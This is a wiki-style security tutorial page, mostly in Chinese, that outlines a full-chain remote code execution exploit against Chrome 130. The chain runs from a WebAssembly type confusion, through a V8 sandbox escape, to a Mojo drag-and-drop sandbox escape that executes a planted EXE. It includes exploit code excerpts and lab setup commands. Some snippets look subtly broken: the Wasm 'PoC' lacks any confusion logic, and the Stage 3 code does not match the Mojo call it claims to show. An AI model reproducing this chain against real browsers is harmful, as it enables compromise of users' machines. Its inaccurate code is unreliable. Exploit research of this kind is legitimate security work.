# Chrome Exploiting

{{#include ../banners/hacktricks-training.md}}

> 本页面基于研究系列 **“101 Chrome Exploitation”**（Part-0 — Preface），提供一份针对 Google Chrome 130 的现代“full-chain”漏洞利用工作流程的高层但**实用**概览。  
> 目标是为 pentesters and exploit-developers 提供再现或改编这些技术以开展他们自己研究所需的最低背景知识。

## 1. Chrome Architecture Recap
理解攻击面需要知道代码在哪里执行以及哪些 sandboxes 生效。

<details>
<summary>Chrome 进程与 sandbox 布局</summary>
```text
+-------------------------------------------------------------------------+
|                             Chrome Browser                              |
|                                                                         |
|  +----------------------------+      +-----------------------------+    |
|  |      Renderer Process      |      |    Browser/main Process     |    |
|  |  [No direct OS access]     |      |  [OS access]                |    |
|  |  +----------------------+   |      |                             |    |
|  |  |    V8 Sandbox        |   |      |                             |    |
|  |  |  [JavaScript / Wasm] |   |      |                             |    |
|  |  +----------------------+   |      |                             |    |
|  +----------------------------+      +-----------------------------+    |
|               |           IPC/Mojo              |                       |
|               V                                    |                     |
|  +----------------------------+                   |                     |
|  |        GPU Process         |                   |                     |
|  |  [Restricted OS access]    |                   |                     |
|  +----------------------------+                   |                     |
+-------------------------------------------------------------------------+
```
</details>

分层纵深防御：

* **V8 sandbox** (Isolate)：内存权限受限，以防止来自 JITed JS / Wasm 的 arbitrary read/write。
* **Renderer ↔ Browser split** 通过 **Mojo/IPC** 消息传递来保证；renderer 没有本地 FS/网络 访问权限。
* **OS sandboxes** 进一步限制每个进程（Windows Integrity Levels / `seccomp-bpf` / macOS sandbox profiles）。

因此，*远程* 攻击者需要 **三个** 连续的原语：

1. 在 V8 内发生 memory corruption 以获取 **arbitrary RW inside the V8 heap**。
2. 第二个漏洞允许攻击者 **escape the V8 sandbox to full renderer memory**。
3. 最后一个 sandbox-escape（通常是逻辑漏洞而非内存破坏），用于在 **outside of the Chrome OS sandbox** 执行代码。

---

## 2. 阶段 1 – WebAssembly Type-Confusion (CVE-2025-0291)

TurboFan 的 **Turboshaft** 优化存在一个缺陷：当值在 *single basic block loop* 内被生成并消费时，会错误地对 **WasmGC reference types** 进行分类。

影响：
* 编译器 **skips the type-check**，将一个 *reference* (`externref/anyref`) 视为 *int64*。
* 精心构造的 Wasm 允许将 JS 对象头与攻击者控制的数据重叠 → <code>addrOf()</code> & <code>fakeObj()</code> **AAW / AAR primitives**。

Minimal PoC (excerpt):
```WebAssembly
(module
(type $t0 (func (param externref) (result externref)))
(func $f (param $p externref) (result externref)
(local $l externref)
block $exit
loop $loop
local.get $p      ;; value with real ref-type
;; compiler incorrectly re-uses it as int64 in the same block
br_if $exit       ;; exit condition keeps us single-block
br   $loop
end
end)
(export "f" (func $f)))
```
从 JS 触发 Trigger optimisation & spray objects:
```js
const wasmMod = new WebAssembly.Module(bytes);
const wasmInst = new WebAssembly.Instance(wasmMod);
const f = wasmInst.exports.f;

for (let i = 0; i < 1e5; ++i) f({});   // warm-up for JIT

// primitives
let victim   = {m: 13.37};
let fake     = arbitrary_data_backed_typedarray;
let addrVict = addrOf(victim);
```
Outcome: **arbitrary read/write within V8**.

---

## 3. 阶段 2 – 逃逸 V8 Sandbox (issue 379140430)

当一个 Wasm 函数被 tier-up-compiled 时，会生成一个 **JS ↔ Wasm wrapper**。当该 Wasm 函数在*仍然位于栈上*时被重新优化，签名不匹配的漏洞会导致这个 wrapper 写出超出受信任的 **`Tuple2`** 对象的末端。

覆盖 `Tuple2` 对象的两个 64-bit 字段将带来对 Renderer 进程内任意地址的 **read/write on any address inside the Renderer process**，从而有效绕过 V8 sandbox。

利用关键步骤：
1. 通过交替使用 turbofan/baseline 代码将函数置于 **Tier-Up** 状态。
2. 在保持对函数的栈上引用的情况下触发 tier-up（`Function.prototype.apply`）。
3. 使用 Stage-1 AAR/AAW 定位并破坏相邻的 `Tuple2`。

Wrapper identification:
```js
function wrapperGen(arg) {
return f(arg);
}
%WasmTierUpFunction(f);          // force tier-up (internals-only flag)
wrapperGen(0x1337n);
```
在发生内存破坏后，我们获得了一个功能齐全的 **renderer R/W primitive**。

---

## 4. Stage 3 – Renderer → OS Sandbox Escape (CVE-2024-11114)

Renderer 可以调用 **Mojo** IPC 接口 `blink.mojom.DragService.startDragging()`，并传入*部分受信任*的参数。通过构造一个指向**任意文件路径**的 `DragData` 结构，renderer 可以让浏览器执行一个*本地*的拖放操作，**在 renderer 沙箱之外**。

滥用该方法，我们可以以编程方式“拖放”一个恶意 EXE（事先放置在一个 world-writable location）到 Desktop，Windows 在文件被放置到 Desktop 后会自动执行某些文件类型。

Example (simplified):
```js
const payloadPath = "C:\\Users\\Public\\explorer.exe";

chrome.webview.postMessage({
type: "DragStart",
data: {
title: "MyFile",
file_path: payloadPath,
mime_type: "application/x-msdownload"
}
});
```
不需要额外的内存破坏 – **逻辑缺陷** 使我们能够以用户权限任意执行文件。

---

## 5. 完整链路流程

1. **用户访问** 恶意网页。
2. **阶段 1**: Wasm module abuses CVE-2025-0291 → V8 heap AAR/AAW.
3. **阶段 2**: Wrapper mismatch 导致 `Tuple2` 损坏 → 逃逸 V8 沙箱。
4. **阶段 3**: `startDragging()` IPC → 逃逸 OS 沙箱并执行 payload。

结果：**Remote Code Execution (RCE)** 在主机上 (Chrome 130, Windows/Linux/macOS)。

---

## 6. 实验与调试设置
```bash
# Spin-up local HTTP server w/ PoCs
npm i -g http-server
git clone https://github.com/Petitoto/chromium-exploit-dev
cd chromium-exploit-dev
http-server -p 8000 -c -1

# Windows kernel debugging
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbgx.exe" -symbolpath srv*C:\symbols*https://msdl.microsoft.com/download/symbols
```
启动 Chrome 的 *开发* 版本时有用的标志：
```bash
chrome.exe --no-sandbox --disable-gpu --single-process --js-flags="--allow-natives-syntax"
```
## 7. Renderer → kernel escape resource

当 renderer exploit 需要一个留在 seccomp profile 内的 kernel pivot 时，滥用仍可在 sandbox 内访问到的 AF_UNIX `MSG_OOB` sockets 提供了一个确定的路径。检查下面的 Linux kernel exploitation 案例研究以了解 SKB UAF → kernel RCE 链：

{{#ref}}
linux-kernel-exploitation/af-unix-msg-oob-uaf-skb-primitives.md
{{#endref}}

---

## 要点

* **WebAssembly JIT bugs** 仍然是可靠的入口 —— 类型系统仍然很年轻。
* 在 V8 内获得第二个 memory-corruption bug（例如 wrapper mismatch）会大幅简化 **V8-sandbox escape**。
* 特权的 Mojo IPC 接口中的逻辑级弱点通常足以实现 **final sandbox escape** —— 注意 *non-memory* 的漏洞。



## References
- [101 Chrome Exploitation — Part 0 (Preface)](https://opzero.ru/en/press/101-chrome-exploitation-part-0-preface/)
- [Chromium security architecture](https://chromium.org/developers/design-documents/security)
{{#include ../banners/hacktricks-training.md}}
